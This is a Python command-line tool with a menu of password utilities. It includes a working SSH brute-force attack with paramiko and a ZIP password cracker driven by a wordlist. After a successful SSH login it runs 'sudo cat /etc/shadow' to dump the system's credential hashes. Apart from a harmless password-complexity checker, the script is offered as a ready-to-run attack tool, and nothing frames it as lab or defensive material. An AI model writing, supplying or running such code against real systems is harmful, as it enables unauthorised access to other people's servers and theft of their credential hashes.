import sys
import time
import re
import paramiko
import zipfile
import logging
from logging.handlers import TimedRotatingFileHandler, RotatingFileHandler

# Iterate through each password in the given file and log progress
def file_iteration(password_file):
    log_file = "logfile.txt"
    create_rotating_log(log_file)

    try:
        with open(password_file, "r") as file:
            for password in file:
                password = password.strip()
                print(f"Testing password: {password}")
                time.sleep(1)

    except FileNotFoundError as e:
        print('Error: Password file not found!')
        logging.exception(e)

    logging.info('Completed iterating through the password file.')

# Search for a specific string within a password file
def string_search(target_string, password_file):
    try:
        with open(password_file, "r") as file:
            for password in file:
                if target_string.lower() == password.strip().lower():
                    print("\nThe string is present in the password file!")
                    sys.exit(0)
        print("\nThe string was not found in the password file.")
    except FileNotFoundError as e:
        print('Error: Password file not found!')
        logging.exception(e)

    create_timed_rotating_log("search_log.txt")
    sys.exit(0)

# Evaluate a password against given complexity requirements
def evaluate_password(password, length_req, caps_req, nums_req, syms_req):
    length = len(password)
    caps = len(re.findall(r'[A-Z]', password))
    nums = len(re.findall(r'[0-9]', password))
    syms = len(re.findall(r'[^A-Za-z0-9]', password))

    print(f"\nPassword length: {length} (Required: {length_req}) - {'Met' if length >= length_req else 'Not Met'}")
    print(f"Uppercase letters: {caps} (Required: {caps_req}) - {'Met' if caps >= caps_req else 'Not Met'}")
    print(f"Numerical digits: {nums} (Required: {nums_req}) - {'Met' if nums >= nums_req else 'Not Met'}")
    print(f"Special characters: {syms} (Required: {syms_req}) - {'Met' if syms >= syms_req else 'Not Met'}")

    if all([length >= length_req, caps >= caps_req, nums >= nums_req, syms >= syms_req]):
        print("\nSUCCESS: Your password meets all complexity requirements!")
    else:
        print("\nFAILURE: Your password does not meet all complexity requirements.")
    print("Exiting program...")

# Attempt SSH login using a list of passwords
def ssh_brute_force(host, username, password_file):
    attempts = 0

    try:
        with open(password_file, "r") as file:
            for password in file:
                password = password.strip()
                print(f"[{attempts}] Trying password: '{password}'")

                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh_client.connect(host, username=username, password=password, timeout=1)
                    print(f"[>] Successful login with password: '{password}'")
                    dump_credential_hashes(ssh_client)
                    ssh_client.close()
                    break
                except paramiko.AuthenticationException:
                    print("[X] Incorrect password.")
                except paramiko.SSHException as e:
                    print(f"[X] SSH error: {e}")
                finally:
                    attempts += 1
    except FileNotFoundError as e:
        print('Error: Password file not found!')
        logging.exception(e)

# Dump credential hashes from a connected SSH client
def dump_credential_hashes(ssh_client):
    try:
        stdin, stdout, stderr = ssh_client.exec_command('sudo -n true')
        if stdout.channel.recv_exit_status() != 0:
            print("[X] No sudo privileges or password required for sudo.")
            return

        stdin, stdout, stderr = ssh_client.exec_command('sudo cat /etc/shadow')
        shadow_contents = stdout.read().decode()
        error = stderr.read().decode()

        if shadow_contents:
            print("[>] Successfully dumped credential hashes:\n")
            print(shadow_contents)
        elif error:
            print(f"[X] Error: {error}")
        else:
            print("[X] Failed to dump credential hashes.")
    except Exception as e:
        print(f"[X] Error dumping credential hashes: {e}")

# Attempt to crack a password-protected ZIP file
def zip_brute_force(zip_filename, password_file):
    try:
        zip_file = zipfile.ZipFile(zip_filename)
    except zipfile.BadZipFile:
        print("[X] Invalid or corrupted ZIP file.")
        return

    try:
        with open(password_file, 'r') as file:
            for password in file:
                password = password.strip()
                try:
                    zip_file.extractall(pwd=password.encode('utf-8'))
                    print(f"[>] Correct password found: '{password}'")
                    return
                except (RuntimeError, zipfile.BadZipFile):
                    print(f"[X] Invalid password: '{password}'")
    except FileNotFoundError as e:
        print('Error: Password file not found!')
        logging.exception(e)
    print("Password cracking failed.")

# Create a timed rotating log
def create_timed_rotating_log(path):
    logger = logging.getLogger("Timed Rotating Log")
    logger.setLevel(logging.INFO)
    handler = TimedRotatingFileHandler(path, when="m", interval=1, backupCount=5)
    logger.addHandler(handler)

# Create a rotating log
def create_rotating_log(path):
    logger = logging.getLogger("Rotating Log")
    logger.setLevel(logging.INFO)
    handler = RotatingFileHandler(path, maxBytes=20, backupCount=5)
    logger.addHandler(handler)

# Main menu for user input
def main():
    mode = input("""Select an option:
1. Iterate through a password list
2. Search for a string in a password list
3. Evaluate password complexity
4. Perform SSH brute force attack
5. Crack password-protected ZIP file
Enter your choice: """)

    if mode == "1":
        file = input("Enter the password list filename (e.g., passwords.txt): ")
        file_iteration(file)
    elif mode == "2":
        phrase = input("Enter the string to search for: ")
        file = input("Enter the password list filename (e.g., passwords.txt): ")
        string_search(phrase, file)
    elif mode == "3":
        password = input("Enter the password to evaluate: ")
        length_req = int(input("Minimum length required: "))
        caps_req = int(input("Minimum number of uppercase letters required: "))
        nums_req = int(input("Minimum number of digits required: "))
        syms_req = int(input("Minimum number of special characters required: "))
        evaluate_password(password, length_req, caps_req, nums_req, syms_req)
    elif mode == "4":
        host = input("Enter the SSH server IP address: ")
        username = input("Enter the SSH username: ")
        passwords = input("Enter the password list filename (e.g., passwords.txt): ")
        ssh_brute_force(host, username, passwords)
    elif mode == "5":
        zip_filename = input("Enter the ZIP filename (e.g., protected.zip): ")
        password_file = input("Enter the password list filename (e.g., passwords.txt): ")
        zip_brute_force(zip_filename, password_file)
    else:
        print("Invalid input. Exiting program.")
        sys.exit(1)

if __name__ == "__main__":
    main()
